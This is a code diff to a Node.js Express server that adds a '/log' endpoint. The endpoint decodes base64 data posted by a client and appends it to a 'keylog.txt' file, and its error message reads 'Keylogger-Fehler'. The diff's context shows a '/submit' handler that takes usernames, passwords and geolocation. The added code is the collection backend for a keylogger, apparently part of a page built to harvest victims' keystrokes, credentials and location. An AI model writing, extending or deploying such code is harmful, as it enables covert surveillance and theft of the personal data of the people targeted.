@@ -11,6 +11,24 @@ app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.json());
 
+app.post('/log', (req, res) => {
+    const encryptedData = req.body.data;
+    const logPath = path.join(__dirname, 'private_logs', 'keylog.txt');
+
+    if (!fs.existsSync(path.dirname(logPath))) {
+        fs.mkdirSync(path.dirname(logPath), { recursive: true });
+    }
+  
+    try {
+        const decoded = decodeURIComponent(atob(encryptedData));
+        fs.appendFileSync(logPath, `${new Date().toISOString()} | ${decoded}\n`);
+        res.status(204).end();
+    } catch (err) {
+        console.error("⚠️ Keylogger-Fehler:", err);
+        res.status(400).end();
+    }
+});
+
 app.post('/submit', async (req, res) => {
   try {
     const { username, password, latitude, longitude } = req.body;
